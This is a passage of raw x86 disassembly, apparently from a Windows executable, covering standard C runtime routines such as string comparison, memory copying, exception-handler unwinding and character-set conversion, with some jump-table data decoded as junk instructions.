  4264c7:	cmp    esi,DWORD PTR ds:0x45c928
  4264cd:	je     0x4264d6
  4264cf:	push   esi
  4264d0:	call   0x4244ba
  4264d5:	pop    ecx
  4264d6:	pop    esi
  4264d7:	ret    
  4264d8:	int3   
  4264d9:	int3   
  4264da:	int3   
  4264db:	int3   
  4264dc:	int3   
  4264dd:	int3   
  4264de:	int3   
  4264df:	int3   
  4264e0:	push   ebp
  4264e1:	mov    ebp,esp
  4264e3:	push   esi
  4264e4:	xor    eax,eax
  4264e6:	push   eax
  4264e7:	push   eax
  4264e8:	push   eax
  4264e9:	push   eax
  4264ea:	push   eax
  4264eb:	push   eax
  4264ec:	push   eax
  4264ed:	push   eax
  4264ee:	mov    edx,DWORD PTR [ebp+0xc]
  4264f1:	lea    ecx,[ecx+0x0]
  4264f4:	mov    al,BYTE PTR [edx]
  4264f6:	or     al,al
  4264f8:	je     0x426503
  4264fa:	add    edx,0x1
  4264fd:	bts    DWORD PTR [esp],eax
  426501:	jmp    0x4264f4
  426503:	mov    esi,DWORD PTR [ebp+0x8]
  426506:	or     ecx,0xffffffff
  426509:	lea    ecx,[ecx+0x0]
  42650c:	add    ecx,0x1
  42650f:	mov    al,BYTE PTR [esi]
  426511:	or     al,al
  426513:	je     0x42651e
  426515:	add    esi,0x1
  426518:	bt     DWORD PTR [esp],eax
  42651c:	jae    0x42650c
  42651e:	mov    eax,ecx
  426520:	add    esp,0x20
  426523:	pop    esi
  426524:	leave  
  426525:	ret    
  426526:	int3   
  426527:	int3   
  426528:	int3   
  426529:	int3   
  42652a:	int3   
  42652b:	int3   
  42652c:	int3   
  42652d:	int3   
  42652e:	int3   
  42652f:	int3   
  426530:	mov    edx,DWORD PTR [esp+0x4]
  426534:	mov    ecx,DWORD PTR [esp+0x8]
  426538:	test   edx,0x3
  42653e:	jne    0x42657c
  426540:	mov    eax,DWORD PTR [edx]
  426542:	cmp    al,BYTE PTR [ecx]
  426544:	jne    0x426574
  426546:	or     al,al
  426548:	je     0x426570
  42654a:	cmp    ah,BYTE PTR [ecx+0x1]
  42654d:	jne    0x426574
  42654f:	or     ah,ah
  426551:	je     0x426570
  426553:	shr    eax,0x10
  426556:	cmp    al,BYTE PTR [ecx+0x2]
  426559:	jne    0x426574
  42655b:	or     al,al
  42655d:	je     0x426570
  42655f:	cmp    ah,BYTE PTR [ecx+0x3]
  426562:	jne    0x426574
  426564:	add    ecx,0x4
  426567:	add    edx,0x4
  42656a:	or     ah,ah
  42656c:	jne    0x426540
  42656e:	mov    edi,edi
  426570:	xor    eax,eax
  426572:	ret    
  426573:	nop
  426574:	sbb    eax,eax
  426576:	shl    eax,1
  426578:	add    eax,0x1
  42657b:	ret    
  42657c:	test   edx,0x1
  426582:	je     0x42659c
  426584:	mov    al,BYTE PTR [edx]
  426586:	add    edx,0x1
  426589:	cmp    al,BYTE PTR [ecx]
  42658b:	jne    0x426574
  42658d:	add    ecx,0x1
  426590:	or     al,al
  426592:	je     0x426570
  426594:	test   edx,0x2
  42659a:	je     0x426540
  42659c:	mov    ax,WORD PTR [edx]
  42659f:	add    edx,0x2
  4265a2:	cmp    al,BYTE PTR [ecx]
  4265a4:	jne    0x426574
  4265a6:	or     al,al
  4265a8:	je     0x426570
  4265aa:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ad:	jne    0x426574
  4265af:	or     ah,ah
  4265b1:	je     0x426570
  4265b3:	add    ecx,0x2
  4265b6:	jmp    0x426540
  4265b8:	int3   
  4265b9:	int3   
  4265ba:	int3   
  4265bb:	int3   
  4265bc:	int3   
  4265bd:	int3   
  4265be:	int3   
  4265bf:	int3   
  4265c0:	mov    eax,DWORD PTR [esp+0xc]
  4265c4:	test   eax,eax
  4265c6:	je     0x426612
  4265c8:	mov    edx,DWORD PTR [esp+0x4]
  4265cc:	push   esi
  4265cd:	push   edi
  4265ce:	mov    esi,edx
  4265d0:	mov    edi,DWORD PTR [esp+0x10]
  4265d4:	or     edx,edi
  4265d6:	and    edx,0x3
  4265d9:	je     0x426613
  4265db:	test   eax,0x1
  4265e0:	je     0x4265f3
  4265e2:	mov    cl,BYTE PTR [esi]
  4265e4:	cmp    cl,BYTE PTR [edi]
  4265e6:	jne    0x426640
  4265e8:	add    esi,0x1
  4265eb:	add    edi,0x1
  4265ee:	sub    eax,0x1
  4265f1:	je     0x426610
  4265f3:	mov    cl,BYTE PTR [esi]
  4265f5:	mov    dl,BYTE PTR [edi]
  4265f7:	cmp    cl,dl
  4265f9:	jne    0x426640
  4265fb:	mov    cl,BYTE PTR [esi+0x1]
  4265fe:	mov    dl,BYTE PTR [edi+0x1]
  426601:	cmp    cl,dl
  426603:	jne    0x426640
  426605:	add    edi,0x2
  426608:	add    esi,0x2
  42660b:	sub    eax,0x2
  42660e:	jne    0x4265f3
  426610:	pop    edi
  426611:	pop    esi
  426612:	ret    
  426613:	mov    ecx,eax
  426615:	and    eax,0x3
  426618:	shr    ecx,0x2
  42661b:	je     0x426648
  42661d:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42661f:	je     0x426648
  426621:	mov    ecx,DWORD PTR [esi-0x4]
  426624:	mov    edx,DWORD PTR [edi-0x4]
  426627:	cmp    cl,dl
  426629:	jne    0x42663b
  42662b:	cmp    ch,dh
  42662d:	jne    0x42663b
  42662f:	shr    ecx,0x10
  426632:	shr    edx,0x10
  426635:	cmp    cl,dl
  426637:	jne    0x42663b
  426639:	cmp    ch,dh
  42663b:	mov    eax,0x0
  426640:	sbb    eax,eax
  426642:	pop    edi
  426643:	sbb    eax,0xffffffff
  426646:	pop    esi
  426647:	ret    
  426648:	test   eax,eax
  42664a:	je     0x426610
  42664c:	mov    edx,DWORD PTR [esi]
  42664e:	mov    ecx,DWORD PTR [edi]
  426650:	cmp    dl,cl
  426652:	jne    0x42663b
  426654:	sub    eax,0x1
  426657:	je     0x426675
  426659:	cmp    dh,ch
  42665b:	jne    0x42663b
  42665d:	sub    eax,0x1
  426660:	je     0x426675
  426662:	and    ecx,0xff0000
  426668:	and    edx,0xff0000
  42666e:	cmp    edx,ecx
  426670:	jne    0x42663b
  426672:	sub    eax,0x1
  426675:	pop    edi
  426676:	pop    esi
  426677:	ret    
  426678:	int3   
  426679:	int3   
  42667a:	int3   
  42667b:	int3   
  42667c:	int3   
  42667d:	int3   
  42667e:	int3   
  42667f:	int3   
  426680:	push   ebp
  426681:	mov    ebp,esp
  426683:	push   edi
  426684:	push   esi
  426685:	push   ebx
  426686:	mov    ecx,DWORD PTR [ebp+0x10]
  426689:	jecxz  0x4266b2
  42668b:	mov    ebx,ecx
  42668d:	mov    edi,DWORD PTR [ebp+0x8]
  426690:	mov    esi,edi
  426692:	xor    eax,eax
  426694:	repnz scas al,BYTE PTR es:[edi]
  426696:	neg    ecx
  426698:	add    ecx,ebx
  42669a:	mov    edi,esi
  42669c:	mov    esi,DWORD PTR [ebp+0xc]
  42669f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4266a1:	mov    al,BYTE PTR [esi-0x1]
  4266a4:	xor    ecx,ecx
  4266a6:	cmp    al,BYTE PTR [edi-0x1]
  4266a9:	ja     0x4266b0
  4266ab:	je     0x4266b2
  4266ad:	sub    ecx,0x2
  4266b0:	not    ecx
  4266b2:	mov    eax,ecx
  4266b4:	pop    ebx
  4266b5:	pop    esi
  4266b6:	pop    edi
  4266b7:	leave  
  4266b8:	ret    
  4266b9:	int3   
  4266ba:	int3   
  4266bb:	int3   
  4266bc:	int3   
  4266bd:	int3   
  4266be:	int3   
  4266bf:	int3   
  4266c0:	push   ebp
  4266c1:	mov    ebp,esp
  4266c3:	push   esi
  4266c4:	xor    eax,eax
  4266c6:	push   eax
  4266c7:	push   eax
  4266c8:	push   eax
  4266c9:	push   eax
  4266ca:	push   eax
  4266cb:	push   eax
  4266cc:	push   eax
  4266cd:	push   eax
  4266ce:	mov    edx,DWORD PTR [ebp+0xc]
  4266d1:	lea    ecx,[ecx+0x0]
  4266d4:	mov    al,BYTE PTR [edx]
  4266d6:	or     al,al
  4266d8:	je     0x4266e3
  4266da:	add    edx,0x1
  4266dd:	bts    DWORD PTR [esp],eax
  4266e1:	jmp    0x4266d4
  4266e3:	mov    esi,DWORD PTR [ebp+0x8]
  4266e6:	mov    edi,edi
  4266e8:	mov    al,BYTE PTR [esi]
  4266ea:	or     al,al
  4266ec:	je     0x4266fa
  4266ee:	add    esi,0x1
  4266f1:	bt     DWORD PTR [esp],eax
  4266f5:	jae    0x4266e8
  4266f7:	lea    eax,[esi-0x1]
  4266fa:	add    esp,0x20
  4266fd:	pop    esi
  4266fe:	leave  
  4266ff:	ret    
  426700:	push   ebp
  426701:	mov    ebp,esp
  426703:	push   ebx
  426704:	push   esi
  426705:	push   edi
  426706:	push   ebp
  426707:	push   0x0
  426709:	push   0x0
  42670b:	push   0x426718
  426710:	push   DWORD PTR [ebp+0x8]
  426713:	call   0x42718e
  426718:	pop    ebp
  426719:	pop    edi
  42671a:	pop    esi
  42671b:	pop    ebx
  42671c:	mov    esp,ebp
  42671e:	pop    ebp
  42671f:	ret    
  426720:	mov    ecx,DWORD PTR [esp+0x4]
  426724:	test   DWORD PTR [ecx+0x4],0x6
  42672b:	mov    eax,0x1
  426730:	je     0x426741
  426732:	mov    eax,DWORD PTR [esp+0x8]
  426736:	mov    edx,DWORD PTR [esp+0x10]
  42673a:	mov    DWORD PTR [edx],eax
  42673c:	mov    eax,0x3
  426741:	ret    
  426742:	push   ebx
  426743:	push   esi
  426744:	push   edi
  426745:	mov    eax,DWORD PTR [esp+0x10]
  426749:	push   eax
  42674a:	push   0xfffffffe
  42674c:	push   0x426720
  426751:	push   DWORD PTR fs:0x0
  426758:	mov    DWORD PTR fs:0x0,esp
  42675f:	mov    eax,DWORD PTR [esp+0x20]
  426763:	mov    ebx,DWORD PTR [eax+0x8]
  426766:	mov    esi,DWORD PTR [eax+0xc]
  426769:	cmp    esi,0xffffffff
  42676c:	je     0x42679c
  42676e:	cmp    esi,DWORD PTR [esp+0x24]
  426772:	je     0x42679c
  426774:	lea    esi,[esi+esi*2]
  426777:	mov    ecx,DWORD PTR [ebx+esi*4]
  42677a:	mov    DWORD PTR [esp+0x8],ecx
  42677e:	mov    DWORD PTR [eax+0xc],ecx
  426781:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426786:	jne    0x42679a
  426788:	push   0x101
  42678d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426791:	call   0x4267d6
  426796:	call   DWORD PTR [ebx+esi*4+0x8]
  42679a:	jmp    0x42675f
  42679c:	pop    DWORD PTR fs:0x0
  4267a3:	add    esp,0xc
  4267a6:	pop    edi
  4267a7:	pop    esi
  4267a8:	pop    ebx
  4267a9:	ret    
  4267aa:	xor    eax,eax
  4267ac:	mov    ecx,DWORD PTR fs:0x0
  4267b3:	cmp    DWORD PTR [ecx+0x4],0x426720
  4267ba:	jne    0x4267cc
  4267bc:	mov    edx,DWORD PTR [ecx+0xc]
  4267bf:	mov    edx,DWORD PTR [edx+0xc]
  4267c2:	cmp    DWORD PTR [ecx+0x8],edx
  4267c5:	jne    0x4267cc
  4267c7:	mov    eax,0x1
  4267cc:	ret    
  4267cd:	push   ebx
  4267ce:	push   ecx
  4267cf:	mov    ebx,0x45c94c
  4267d4:	jmp    0x4267e0
  4267d6:	push   ebx
  4267d7:	push   ecx
  4267d8:	mov    ebx,0x45c94c
  4267dd:	mov    ecx,DWORD PTR [ebp+0x8]
  4267e0:	mov    DWORD PTR [ebx+0x8],ecx
  4267e3:	mov    DWORD PTR [ebx+0x4],eax
  4267e6:	mov    DWORD PTR [ebx+0xc],ebp
  4267e9:	pop    ecx
  4267ea:	pop    ebx
  4267eb:	ret    0x4
  4267ee:	int3   
  4267ef:	int3   
  4267f0:	push   ebp
  4267f1:	mov    ebp,esp
  4267f3:	push   edi
  4267f4:	push   esi
  4267f5:	mov    esi,DWORD PTR [ebp+0xc]
  4267f8:	mov    ecx,DWORD PTR [ebp+0x10]
  4267fb:	mov    edi,DWORD PTR [ebp+0x8]
  4267fe:	mov    eax,ecx
  426800:	mov    edx,ecx
  426802:	add    eax,esi
  426804:	cmp    edi,esi
  426806:	jbe    0x426810
  426808:	cmp    edi,eax
  42680a:	jb     0x42698c
  426810:	test   edi,0x3
  426816:	jne    0x42682c
  426818:	shr    ecx,0x2
  42681b:	and    edx,0x3
  42681e:	cmp    ecx,0x8
  426821:	jb     0x42684c
  426823:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426825:	jmp    DWORD PTR [edx*4+0x42693c]
  42682c:	mov    eax,edi
  42682e:	mov    edx,0x3
  426833:	sub    ecx,0x4
  426836:	jb     0x426844
  426838:	and    eax,0x3
  42683b:	add    ecx,eax
  42683d:	jmp    DWORD PTR [eax*4+0x426850]
  426844:	jmp    DWORD PTR [ecx*4+0x42694c]
  42684b:	nop
  42684c:	jmp    DWORD PTR [ecx*4+0x4268d0]
  426853:	nop
  426854:	pusha  
  426855:	push   0x688c0042
  42685a:	inc    edx
  42685b:	add    BYTE PTR [eax+0x23004268],dh
  426861:	ror    DWORD PTR [edx-0x75f877fa],1
  426867:	inc    esi
  426868:	add    DWORD PTR [eax+0x468a0147],ecx
  42686e:	add    al,cl
  426870:	jmp    0x289f077
  426875:	add    esi,0x3
  426878:	add    edi,0x3
  42687b:	cmp    ecx,0x8
  42687e:	jb     0x42684c
  426880:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426882:	jmp    DWORD PTR [edx*4+0x42693c]
  426889:	lea    ecx,[ecx+0x0]
  42688c:	and    edx,ecx
  42688e:	mov    al,BYTE PTR [esi]
  426890:	mov    BYTE PTR [edi],al
  426892:	mov    al,BYTE PTR [esi+0x1]
  426895:	shr    ecx,0x2
  426898:	mov    BYTE PTR [edi+0x1],al
  42689b:	add    esi,0x2
  42689e:	add    edi,0x2
  4268a1:	cmp    ecx,0x8
  4268a4:	jb     0x42684c
  4268a6:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268a8:	jmp    DWORD PTR [edx*4+0x42693c]
  4268af:	nop
  4268b0:	and    edx,ecx
  4268b2:	mov    al,BYTE PTR [esi]
  4268b4:	mov    BYTE PTR [edi],al
  4268b6:	add    esi,0x1
  4268b9:	shr    ecx,0x2
  4268bc:	add    edi,0x1
  4268bf:	cmp    ecx,0x8
  4268c2:	jb     0x42684c
  4268c4:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c6:	jmp    DWORD PTR [edx*4+0x42693c]
  4268cd:	lea    ecx,[ecx+0x0]
  4268d0:	xor    ebp,DWORD PTR [ecx+0x42]
  4268d3:	add    BYTE PTR [eax],ah
  4268d5:	imul   eax,DWORD PTR [edx+0x0],0x426918
  4268dc:	adc    BYTE PTR [ecx+0x42],ch
  4268df:	add    BYTE PTR [eax],cl
  4268e1:	imul   eax,DWORD PTR [edx+0x0],0x426900
  4268e8:	clc    
  4268e9:	push   0x68f00042
  4268ee:	inc    edx
  4268ef:	add    BYTE PTR [ebx-0x761b71bc],cl
  4268f5:	inc    esp
  4268f6:	(bad)  
  4268f7:	in     al,0x8b
  4268f9:	inc    esp
  4268fa:	mov    gs,eax
  4268fc:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  426900:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  426904:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  426908:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  42690c:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  426910:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  426914:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  426918:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  42691c:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  426920:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  426924:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  426928:	lea    eax,[ecx*4+0x0]
  42692f:	add    esi,eax
  426931:	add    edi,eax
  426933:	jmp    DWORD PTR [edx*4+0x42693c]
  42693a:	mov    edi,edi
  42693c:	dec    esp
  42693d:	imul   eax,DWORD PTR [edx+0x0],0x426954
  426944:	pusha  
  426945:	imul   eax,DWORD PTR [edx+0x0],0x426974
  42694c:	mov    eax,DWORD PTR [ebp+0x8]
  42694f:	pop    esi
  426950:	pop    edi
  426951:	leave  
  426952:	ret    
  426953:	nop
  426954:	mov    al,BYTE PTR [esi]
  426956:	mov    BYTE PTR [edi],al
  426958:	mov    eax,DWORD PTR [ebp+0x8]
  42695b:	pop    esi
  42695c:	pop    edi
  42695d:	leave  
  42695e:	ret    
  42695f:	nop
  426960:	mov    al,BYTE PTR [esi]
  426962:	mov    BYTE PTR [edi],al
  426964:	mov    al,BYTE PTR [esi+0x1]
  426967:	mov    BYTE PTR [edi+0x1],al
  42696a:	mov    eax,DWORD PTR [ebp+0x8]
  42696d:	pop    esi
  42696e:	pop    edi
  42696f:	leave  
  426970:	ret    
  426971:	lea    ecx,[ecx+0x0]
  426974:	mov    al,BYTE PTR [esi]
  426976:	mov    BYTE PTR [edi],al
  426978:	mov    al,BYTE PTR [esi+0x1]
  42697b:	mov    BYTE PTR [edi+0x1],al
  42697e:	mov    al,BYTE PTR [esi+0x2]
  426981:	mov    BYTE PTR [edi+0x2],al
  426984:	mov    eax,DWORD PTR [ebp+0x8]
  426987:	pop    esi
  426988:	pop    edi
  426989:	leave  
  42698a:	ret    
  42698b:	nop
  42698c:	lea    esi,[ecx+esi*1-0x4]
  426990:	lea    edi,[ecx+edi*1-0x4]
  426994:	test   edi,0x3
  42699a:	jne    0x4269c0
  42699c:	shr    ecx,0x2
  42699f:	and    edx,0x3
  4269a2:	cmp    ecx,0x8
  4269a5:	jb     0x4269b4
  4269a7:	std    
  4269a8:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4269aa:	cld    
  4269ab:	jmp    DWORD PTR [edx*4+0x426ad8]
  4269b2:	mov    edi,edi
  4269b4:	neg    ecx
  4269b6:	jmp    DWORD PTR [ecx*4+0x426a88]
  4269bd:	lea    ecx,[ecx+0x0]
  4269c0:	mov    eax,edi
  4269c2:	mov    edx,0x3
  4269c7:	cmp    ecx,0x4
  4269ca:	jb     0x4269d8
  4269cc:	and    eax,0x3
  4269cf:	sub    ecx,eax
  4269d1:	jmp    DWORD PTR [eax*4+0x4269dc]
  4269d8:	jmp    DWORD PTR [ecx*4+0x426ad8]
  4269df:	nop
  4269e0:	in     al,dx
  4269e1:	imul   eax,DWORD PTR [edx+0x0],0x426a10
  4269e8:	cmp    BYTE PTR [edx+0x42],ch
  4269eb:	add    BYTE PTR [edx-0x2edcfcba],cl
  4269f1:	mov    BYTE PTR [edi+0x3],al
  4269f4:	sub    esi,0x1
  4269f7:	shr    ecx,0x2
  4269fa:	sub    edi,0x1
  4269fd:	cmp    ecx,0x8
  426a00:	jb     0x4269b4
  426a02:	std    
  426a03:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a05:	cld    
  426a06:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a0d:	lea    ecx,[ecx+0x0]
  426a10:	mov    al,BYTE PTR [esi+0x3]
  426a13:	and    edx,ecx
  426a15:	mov    BYTE PTR [edi+0x3],al
  426a18:	mov    al,BYTE PTR [esi+0x2]
  426a1b:	shr    ecx,0x2
  426a1e:	mov    BYTE PTR [edi+0x2],al
  426a21:	sub    esi,0x2
  426a24:	sub    edi,0x2
  426a27:	cmp    ecx,0x8
  426a2a:	jb     0x4269b4
  426a2c:	std    
  426a2d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a2f:	cld    
  426a30:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a37:	nop
  426a38:	mov    al,BYTE PTR [esi+0x3]
  426a3b:	and    edx,ecx
  426a3d:	mov    BYTE PTR [edi+0x3],al
  426a40:	mov    al,BYTE PTR [esi+0x2]
  426a43:	mov    BYTE PTR [edi+0x2],al
  426a46:	mov    al,BYTE PTR [esi+0x1]
  426a49:	shr    ecx,0x2
  426a4c:	mov    BYTE PTR [edi+0x1],al
  426a4f:	sub    esi,0x3
  426a52:	sub    edi,0x3
  426a55:	cmp    ecx,0x8
  426a58:	jb     0x4269b4
  426a5e:	std    
  426a5f:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a61:	cld    
  426a62:	jmp    DWORD PTR [edx*4+0x426ad8]
  426a69:	lea    ecx,[ecx+0x0]
  426a6c:	mov    WORD PTR [edx+0x42],gs
  426a6f:	add    BYTE PTR [edx+ebp*2+0x6a9c0042],dl
  426a76:	inc    edx
  426a77:	add    BYTE PTR [edx+ebp*2+0x6aac0042],ah
  426a7e:	inc    edx
  426a7f:	add    BYTE PTR [edx+ebp*2+0x6abc0042],dh
  426a86:	inc    edx
  426a87:	add    bh,cl
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426a91:	inc    esp
  426a92:	(bad)  
  426a93:	sbb    al,0x8b
  426a95:	inc    esp
  426a96:	mov    ds,WORD PTR [eax]
  426a98:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426a9c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426aa0:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426aa4:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426aa8:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426aac:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426ab0:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  426ab4:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  426ab8:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  426abc:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  426ac0:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  426ac4:	lea    eax,[ecx*4+0x0]
  426acb:	add    esi,eax
  426acd:	add    edi,eax
  426acf:	jmp    DWORD PTR [edx*4+0x426ad8]
  426ad6:	mov    edi,edi
  426ad8:	call   0xf042ad47
  426add:	push   0x42
  426adf:	add    BYTE PTR [eax],al
  426ae1:	imul   eax,DWORD PTR [edx+0x0],0x14
  426ae5:	imul   eax,DWORD PTR [edx+0x0],0xffffff8b
  426ae9:	inc    ebp
  426aea:	or     BYTE PTR [esi+0x5f],bl
  426aed:	leave  
  426aee:	ret    
  426aef:	nop
  426af0:	mov    al,BYTE PTR [esi+0x3]
  426af3:	mov    BYTE PTR [edi+0x3],al
  426af6:	mov    eax,DWORD PTR [ebp+0x8]
  426af9:	pop    esi
  426afa:	pop    edi
  426afb:	leave  
  426afc:	ret    
  426afd:	lea    ecx,[ecx+0x0]
  426b00:	mov    al,BYTE PTR [esi+0x3]
  426b03:	mov    BYTE PTR [edi+0x3],al
  426b06:	mov    al,BYTE PTR [esi+0x2]
  426b09:	mov    BYTE PTR [edi+0x2],al
  426b0c:	mov    eax,DWORD PTR [ebp+0x8]
  426b0f:	pop    esi
  426b10:	pop    edi
  426b11:	leave  
  426b12:	ret    
  426b13:	nop
  426b14:	mov    al,BYTE PTR [esi+0x3]
  426b17:	mov    BYTE PTR [edi+0x3],al
  426b1a:	mov    al,BYTE PTR [esi+0x2]
  426b1d:	mov    BYTE PTR [edi+0x2],al
  426b20:	mov    al,BYTE PTR [esi+0x1]
  426b23:	mov    BYTE PTR [edi+0x1],al
  426b26:	mov    eax,DWORD PTR [ebp+0x8]
  426b29:	pop    esi
  426b2a:	pop    edi
  426b2b:	leave  
  426b2c:	ret    
  426b2d:	push   ebp
  426b2e:	mov    ebp,esp
  426b30:	sub    esp,0xc
  426b33:	mov    eax,ds:0x45c430
  426b38:	xor    eax,DWORD PTR [ebp+0x4]
  426b3b:	and    BYTE PTR [ebp-0x6],0x0
  426b3f:	push   0x6
  426b41:	mov    DWORD PTR [ebp-0x4],eax
  426b44:	lea    eax,[ebp-0xc]
  426b47:	push   eax
  426b48:	push   0x1004
  426b4d:	push   DWORD PTR [ebp+0x8]
  426b50:	call   DWORD PTR ds:0x4280e0
  426b56:	test   eax,eax
  426b58:	jne    0x426b5f
  426b5a:	or     eax,0xffffffff
  426b5d:	jmp    0x426b69
  426b5f:	lea    eax,[ebp-0xc]
  426b62:	push   eax
  426b63:	call   0x426e6e
  426b68:	pop    ecx
  426b69:	mov    ecx,DWORD PTR [ebp-0x4]
  426b6c:	xor    ecx,DWORD PTR [ebp+0x4]
  426b6f:	call   0x423f7c
  426b74:	leave  
  426b75:	ret    
  426b76:	push   0x38
  426b78:	push   0x428eb0
  426b7d:	call   0x4238a8
  426b82:	mov    eax,ds:0x45c430
  426b87:	xor    eax,DWORD PTR [ebp+0x4]
  426b8a:	mov    DWORD PTR [ebp-0x1c],eax
  426b8d:	xor    edi,edi
  426b8f:	mov    DWORD PTR [ebp-0x20],edi
  426b92:	mov    DWORD PTR [ebp-0x24],edi
  426b95:	mov    eax,DWORD PTR [ebp+0x14]
  426b98:	mov    ebx,DWORD PTR [eax]
  426b9a:	mov    DWORD PTR [ebp-0x28],ebx
  426b9d:	mov    DWORD PTR [ebp-0x2c],edi
  426ba0:	mov    eax,DWORD PTR [ebp+0x8]
  426ba3:	cmp    eax,DWORD PTR [ebp+0xc]
  426ba6:	je     0x426d1f
  426bac:	lea    ecx,[ebp-0x40]
  426baf:	push   ecx
  426bb0:	push   eax
  426bb1:	mov    esi,DWORD PTR ds:0x4280a4
  426bb7:	call   esi
  426bb9:	test   eax,eax
  426bbb:	je     0x426bdd
  426bbd:	cmp    DWORD PTR [ebp-0x40],0x1
  426bc1:	jne    0x426bdd
  426bc3:	lea    eax,[ebp-0x40]
  426bc6:	push   eax
  426bc7:	push   DWORD PTR [ebp+0xc]
  426bca:	call   esi
  426bcc:	test   eax,eax
  426bce:	je     0x426bdd
  426bd0:	cmp    DWORD PTR [ebp-0x40],0x1
  426bd4:	jne    0x426bdd
  426bd6:	mov    DWORD PTR [ebp-0x2c],0x1
  426bdd:	cmp    DWORD PTR [ebp-0x2c],edi
  426be0:	je     0x426bfc
  426be2:	cmp    ebx,0xffffffff
  426be5:	je     0x426beb
  426be7:	mov    esi,ebx
  426be9:	jmp    0x426bf7
  426beb:	push   DWORD PTR [ebp+0x10]
  426bee:	call   0x423ec0
  426bf3:	pop    ecx
  426bf4:	mov    esi,eax
  426bf6:	inc    esi
  426bf7:	mov    DWORD PTR [ebp-0x44],esi
  426bfa:	jmp    0x426bff
  426bfc:	mov    esi,DWORD PTR [ebp-0x44]
  426bff:	cmp    DWORD PTR [ebp-0x2c],edi
  426c02:	jne    0x426c1e
  426c04:	push   edi
  426c05:	push   edi
  426c06:	push   ebx
  426c07:	push   DWORD PTR [ebp+0x10]
  426c0a:	push   0x1
  426c0c:	push   DWORD PTR [ebp+0x8]
  426c0f:	call   DWORD PTR ds:0x4280d0
  426c15:	mov    esi,eax
  426c17:	mov    DWORD PTR [ebp-0x44],esi
  426c1a:	cmp    esi,edi
  426c1c:	je     0x426c76
  426c1e:	mov    DWORD PTR [ebp-0x4],edi
  426c21:	lea    eax,[esi+esi*1]
  426c24:	add    eax,0x3
  426c27:	and    eax,0xfffffffc
  426c2a:	call   0x423900
  426c2f:	mov    DWORD PTR [ebp-0x18],esp
  426c32:	mov    ebx,esp
  426c34:	mov    DWORD PTR [ebp-0x48],ebx
  426c37:	lea    eax,[esi+esi*1]
  426c3a:	push   eax
  426c3b:	push   edi
  426c3c:	push   ebx
  426c3d:	call   0x4261b0
  426c42:	add    esp,0xc
  426c45:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c49:	jmp    0x426c62
  426c4b:	xor    eax,eax
  426c4d:	inc    eax
  426c4e:	ret    
  426c4f:	mov    esp,DWORD PTR [ebp-0x18]
  426c52:	call   0x426d45
  426c57:	xor    edi,edi
  426c59:	xor    ebx,ebx
  426c5b:	or     DWORD PTR [ebp-0x4],0xffffffff
  426c5f:	mov    esi,DWORD PTR [ebp-0x44]
  426c62:	cmp    ebx,edi
  426c64:	jne    0x426c84
  426c66:	push   esi
  426c67:	push   0x2
  426c69:	call   0x4249c8
  426c6e:	pop    ecx
  426c6f:	pop    ecx
  426c70:	mov    ebx,eax
  426c72:	cmp    ebx,edi
  426c74:	jne    0x426c7d
  426c76:	xor    eax,eax
  426c78:	jmp    0x426d31
  426c7d:	mov    DWORD PTR [ebp-0x24],0x1
  426c84:	push   esi
  426c85:	push   ebx
  426c86:	push   DWORD PTR [ebp-0x28]
  426c89:	push   DWORD PTR [ebp+0x10]
  426c8c:	push   0x1
  426c8e:	push   DWORD PTR [ebp+0x8]
  426c91:	call   DWORD PTR ds:0x4280d0
  426c97:	test   eax,eax
  426c99:	je     0x426d22
  426c9f:	cmp    DWORD PTR [ebp+0x18],edi
  426ca2:	je     0x426cc4
  426ca4:	push   edi
  426ca5:	push   edi
  426ca6:	push   DWORD PTR [ebp+0x1c]
  426ca9:	push   DWORD PTR [ebp+0x18]
  426cac:	push   esi
  426cad:	push   ebx
  426cae:	push   edi
  426caf:	push   DWORD PTR [ebp+0xc]
  426cb2:	call   DWORD PTR ds:0x428054
  426cb8:	test   eax,eax
  426cba:	je     0x426d22
  426cbc:	mov    eax,DWORD PTR [ebp+0x18]
  426cbf:	mov    DWORD PTR [ebp-0x20],eax
  426cc2:	jmp    0x426d22
  426cc4:	cmp    DWORD PTR [ebp-0x2c],edi
  426cc7:	jne    0x426cdf
  426cc9:	push   edi
  426cca:	push   edi
  426ccb:	push   edi
  426ccc:	push   edi
  426ccd:	push   esi
  426cce:	push   ebx
  426ccf:	push   edi
  426cd0:	push   DWORD PTR [ebp+0xc]
